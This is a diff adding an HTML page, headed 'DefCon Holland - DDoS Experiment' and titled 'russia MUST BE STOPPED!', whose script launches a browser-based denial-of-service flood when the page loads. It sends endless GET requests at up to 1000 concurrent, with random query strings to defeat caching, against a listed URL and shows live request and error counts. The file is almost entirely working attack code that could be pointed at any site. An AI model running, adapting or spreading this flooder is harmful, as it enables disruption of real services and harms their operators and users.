@@ -1,0 +1,73 @@
+
+<head>
+  <meta charset="utf-8" />
+  <title>russia MUST BE STOPPED!</title>
+</head>
+<body style="background-color:black;color:yellow" align="center">
+  <h1>DefCon Holland - DDoS Experiment</h1>
+  <img src="defcon.png">
+  <div id="stats"></div>
+
+<script>
+var targets = ['http://defconholland.jairsantanna.com/']
+
+var targetStats = {}
+targets.forEach((target) => {
+  targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0 }
+})
+
+var statsEl = document.getElementById('stats');
+function printStats() {
+  statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targetStats).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+}
+setInterval(printStats, 1000);
+
+var CONCURRENCY_LIMIT = 1000
+var queue = []
+
+async function fetchWithTimeout(resource, options) {
+  const controller = new AbortController();
+  const id = setTimeout(() => controller.abort(), options.timeout);
+  return fetch(resource, {
+    method: 'GET',
+    mode: 'no-cors',
+    signal: controller.signal
+  }).then((response) => {
+    clearTimeout(id);
+    return response;
+  }).catch((error) => {
+    clearTimeout(id);
+    throw error;
+  });
+}
+
+async function flood(target) {
+  for (var i = 0;; ++i) {
+    if (queue.length > CONCURRENCY_LIMIT) {
+      await queue.shift()
+    }
+    rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+    queue.push(
+      fetchWithTimeout(target+rand, { timeout: 1000 })
+        .catch((error) => {
+          if (error.code === 20 /* ABORT */) {
+            return;
+          }
+          targetStats[target].number_of_errored_responses++;
+        })
+        .then((response) => {
+          if (response && !response.ok) {
+            targetStats[target].number_of_errored_responses++;
+          }
+          targetStats[target].number_of_requests++;
+        })
+
+    )
+  }
+}
+
+// Start
+targets.map(flood)
+</script>
+</body>
+    
